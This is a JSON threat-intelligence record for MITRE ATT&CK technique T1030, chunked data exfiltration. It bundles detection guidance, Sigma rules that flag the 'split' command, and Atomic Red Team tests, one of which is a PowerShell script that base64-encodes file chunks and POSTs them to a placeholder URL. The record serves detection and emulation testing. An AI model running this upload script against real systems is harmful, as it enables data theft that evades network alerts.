{
    "id": "T1030",
    "name": "Data Transfer Size Limits",
    "description": "An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.",
    "platforms": "Linux, macOS, Windows",
    "kill_chain_phases": "Exfiltration",
    "data_sources": "Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow",
    "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). If a process maintains a long connection during which it consistently sends fixed size data packets or a process opens connections and sends fixed sized data packets at regular intervals, it may be performing an aggregate data transfer. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
    "url": "https://attack.mitre.org/techniques/T1030",
    "enrichments": {
        "attack_rule_map": [],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "ba06d68a-4891-4eb5-b634-152e05ec60ee",
                    "7f2bb9d5-6395-4de5-969c-70c11fbe6b12",
                    "c1bd5026-520b-45bd-9a79-82d38cf96c7b",
                    "2dad0cba-c62a-4a4f-949f-5f6ecd619769",
                    "c3888c54-775d-4b2f-b759-75a2ececcbfd"
                ],
                "lookup_results": [
                    {
                        "uuid": "ba06d68a-4891-4eb5-b634-152e05ec60ee",
                        "lookup_data": {
                            "mitre-attack-id": "T1030",
                            "mitre-cti:description": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools. (Citation: University of Birmingham C2)",
                            "mitre-cti:name": "Data Transfer Size Limits Mitigation",
                            "mitre-cti:type": "course-of-action",
                            "raw": "{'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'course-of-action--ba06d68a-4891-4eb5-b634-152e05ec60ee', 'type': 'course-of-action', 'created': '2018-10-17T00:14:20.652Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/mitigations/T1030', 'external_id': 'T1030'}, {'source_name': 'University of Birmingham C2', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf'}], 'modified': '2019-07-24T19:05:56.488Z', 'name': 'Data Transfer Size Limits Mitigation', 'description': 'Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools. (Citation: University of Birmingham C2)', 'x_mitre_deprecated': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7f2bb9d5-6395-4de5-969c-70c11fbe6b12",
                        "lookup_data": {
                            "description": "Detection use of the command \"split\" to split files into parts and possible transfer.",
                            "raw": "author: Igor Fits, Mikhail Larin, oscd.community\ndate: 2020/10/15\ndescription: Detection use of the command \"split\" to split files into parts and possible\n  transfer.\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: /split\nfalsepositives:\n- Legitimate administrative activity\nid: 7f2bb9d5-6395-4de5-969c-70c11fbe6b12\nlevel: low\nlogsource:\n  category: process_creation\n  product: macos\nmodified: 2021/11/27\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1030/T1030.md\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1030\ntitle: Split A File Into Pieces\n",
                            "sigma:id": "7f2bb9d5-6395-4de5-969c-70c11fbe6b12",
                            "title": "Split A File Into Pieces",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "c1bd5026-520b-45bd-9a79-82d38cf96c7b",
                        "lookup_data": {
                            "description": "Operation â€˜Harvestâ€™: A Deep Dive into a Long-term Campaign",
                            "link": "http://www.botvrij.eu/data/feed-osint/c1bd5026-520b-45bd-9a79-82d38cf96c7b.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1633469315",
                            "uuid": "c1bd5026-520b-45bd-9a79-82d38cf96c7b",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "2dad0cba-c62a-4a4f-949f-5f6ecd619769",
                        "lookup_data": {
                            "description": "Detection use of the command \"split\" to split files into parts and possible transfer.",
                            "raw": "author: Igor Fits, oscd.community\ndate: 2020/10/15\ndescription: Detection use of the command \"split\" to split files into parts and possible\n  transfer.\ndetection:\n  condition: selection\n  selection:\n    comm: split\n    type: SYSCALL\nfalsepositives:\n- Legitimate administrative activity\nid: 2dad0cba-c62a-4a4f-949f-5f6ecd619769\nlevel: low\nlogsource:\n  product: linux\n  service: auditd\nmodified: 2022/11/28\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1030/T1030.md\nstatus: test\ntags:\n- attack.exfiltration\n- attack.t1030\ntitle: Split A File Into Pieces - Linux\n",
                            "sigma:id": "2dad0cba-c62a-4a4f-949f-5f6ecd619769",
                            "title": "Split A File Into Pieces - Linux",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "c3888c54-775d-4b2f-b759-75a2ececcbfd",
                        "lookup_data": {
                            "mitre-attack-id": "T1030",
                            "mitre-cti:description": "An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.",
                            "mitre-cti:name": "Data Transfer Size Limits",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Linux', 'macOS', 'Windows'], 'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--c3888c54-775d-4b2f-b759-75a2ececcbfd', 'type': 'attack-pattern', 'created': '2017-05-31T21:30:34.523Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/techniques/T1030', 'external_id': 'T1030'}, {'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'source_name': 'University of Birmingham C2'}], 'modified': '2020-07-14T19:47:46.912Z', 'name': 'Data Transfer Size Limits', 'description': 'An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'exfiltration'}], 'x_mitre_detection': 'Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). If a process maintains a long connection during which it consistently sends fixed size data packets or a process opens connections and sends fixed sized data packets at regular intervals, it may be performing an aggregate data transfer. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)', 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Network Traffic: Network Traffic Flow', 'Network Traffic: Network Connection Creation'], 'x_mitre_is_subtechnique': False}",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1030",
                "display_name": "Data Transfer Size Limits",
                "atomic_tests": [
                    {
                        "name": "Data Transfer Size Limits",
                        "auto_generated_guid": "ab936c51-10f4-46ce-9144-e02137b2016a",
                        "description": "Take a file/directory, split it into 5Mb chunks\n",
                        "supported_platforms": [
                            "macos",
                            "linux"
                        ],
                        "input_arguments": {
                            "file_name": {
                                "description": "File name",
                                "type": "path",
                                "default": "T1030_urandom"
                            },
                            "folder_path": {
                                "description": "Path where the test creates artifacts",
                                "type": "path",
                                "default": "/tmp/T1030"
                            }
                        },
                        "dependency_executor_name": "sh",
                        "dependencies": [
                            {
                                "description": "The file must exist for the test to run.",
                                "prereq_command": "if [ ! -f #{folder_path}/#{file_name} ]; then exit 1; else exit 0; fi;\n",
                                "get_prereq_command": "if [ ! -d #{folder_path} ]; then mkdir -p #{folder_path}; touch #{folder_path}/safe_to_delete; fi; dd if=/dev/urandom of=#{folder_path}/#{file_name} bs=25000000 count=1\n"
                            }
                        ],
                        "executor": {
                            "command": "cd #{folder_path}; split -b 5000000 #{file_name}\nls -l #{folder_path}\n",
                            "cleanup_command": "if [ -f #{folder_path}/safe_to_delete ]; then rm -rf #{folder_path}; fi;\n",
                            "name": "sh"
                        }
                    },
                    {
                        "name": "Network-Based Data Transfer in Small Chunks",
                        "auto_generated_guid": "f0287b58-f4bc-40f6-87eb-692e126e7f8f",
                        "description": "Simulate transferring data over a network in small chunks to evade detection.",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "source_file_path": {
                                "description": "Path to the source file to transfer.",
                                "type": "path",
                                "default": "[User specified]"
                            },
                            "destination_url": {
                                "description": "URL of the destination server.",
                                "type": "url",
                                "default": "http://example.com"
                            },
                            "chunk_size": {
                                "description": "Size of each data chunk (in KB).",
                                "type": "integer",
                                "default": 1024
                            }
                        },
                        "executor": {
                            "name": "powershell",
                            "elevation_required": false,
                            "command": "$file = [System.IO.File]::OpenRead(#{source_file_path})\n$chunkSize = #{chunk_size} * 1KB\n$buffer = New-Object Byte[] $chunkSize\n\nwhile ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {\n    $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)\n    Invoke-WebRequest -Uri #{destination_url} -Method Post -Body $encodedChunk\n}\n$file.Close()\n"
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 11:12:59"
}